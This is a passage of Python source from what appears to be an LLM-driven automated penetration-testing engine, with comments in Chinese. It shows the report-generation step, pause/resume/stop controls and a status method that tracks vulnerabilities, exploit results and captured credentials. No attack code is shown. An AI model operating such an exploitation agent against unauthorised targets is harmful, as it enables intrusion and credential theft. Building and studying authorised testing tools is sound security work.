                json.dump(scan_data, f, ensure_ascii=False, indent=2)
            report = {"session_id": self.session_id, "report_file": str(report_file)}

        self.stage_results[5] = {"report": report, "timestamp": time.time()}

        # ★ 推送报告已生成事件（前端用来自动打开新标签）
        try:
            self._push_notification(
                "报告已生成",
                f"报告已生成: {report.get('html_report', '')}",
                level="success",
            )
            self._broadcast_ws("report_generated", f"报告已生成: {report.get('html_report', '')}", level="success")
        except Exception:
            pass

        return report

    # ==================================================================
    # 控制接口 (供 WebSocket 调用)
    # ==================================================================

    def pause(self) -> None:
        self.is_paused = True
        self.console.print(f"[bold yellow]⏸️ AutoPilot 已暂停 (session={self.session_id})[/bold yellow]")
        logger.info("[AutoPilotEngine] 暂停: session_id=%s", self.session_id)

    def resume(self) -> None:
        self.is_paused = False
        self.console.print(f"[bold green]▶️ AutoPilot 已恢复 (session={self.session_id})[/bold green]")
        logger.info("[AutoPilotEngine] 恢复: session_id=%s", self.session_id)

    def stop(self) -> None:
        self.is_stopped = True
        self.is_paused = False
        self.console.print(f"[bold red]⏹️ AutoPilot 已停止 (session={self.session_id})[/bold red]")
        logger.info("[AutoPilotEngine] 停止: session_id=%s", self.session_id)

    def set_strategy(self, text: str) -> None:
        self.user_strategy = text
        self.console.print(f"[bold cyan]📝 用户策略已更新: {text[:100]}[/bold cyan]")
        logger.info("[AutoPilotEngine] 策略更新: session_id=%s, text=%s", self.session_id, text[:100])

    def get_status(self) -> Dict[str, Any]:
        return {
            "session_id": self.session_id,
            "target": self.target,
            "current_stage": self.current_stage,
            "stage_name": self._stage_name(self.current_stage),
            "is_paused": self.is_paused,
            "is_stopped": self.is_stopped,
            "user_strategy": self.user_strategy,
            "vuln_count": len(self.vuln_list),
            "exploit_count": len(self.exploit_results),
            "credential_count": len(self.found_credentials),
            "updated_at": time.time(),
        }

    def _stage_name(self, stage: int) -> str:
        names = {
            1: "Initialization",
            2: "Info Gathering",
            3: "Vuln Prioritization",
            4: "Exploitation",
            5: "Reporting",
        }
        return names.get(stage, f"Unknown({stage})")

    async def _check_pause(self) -> None:
        while self.is_paused and not self.is_stopped:
            await asyncio.sleep(0.5)
        if self.is_stopped:
            raise asyncio.CancelledError("AutoPilot 已停止")

    async def _wait_if_paused(self) -> bool:
        if self.is_stopped:
            return False
        await self._check_pause()
        return True


# ========================================================================
# 兼容旧接口 (供 orchestrator.py 调用)
# ========================================================================

async def run_autopilot_v2(
    session_id: str,
    target: str,
    llm_client: LLMClient,
    state_manager: StateManager,
    settings: Settings,
    console: Optional[Console] = None,
    security: Optional[SecurityGuard] = None,
) -> Dict[str, Any]:
    """
    兼容旧接口的 AutoPilot v2 入口函数。
    """
    engine = AutoPilotEngine(
        session_id=session_id,
        target=target,
        llm_client=llm_client,
        state_manager=state_manager,
        settings=settings,
        console=console,
        security=security,
    )
    return await engine.run()
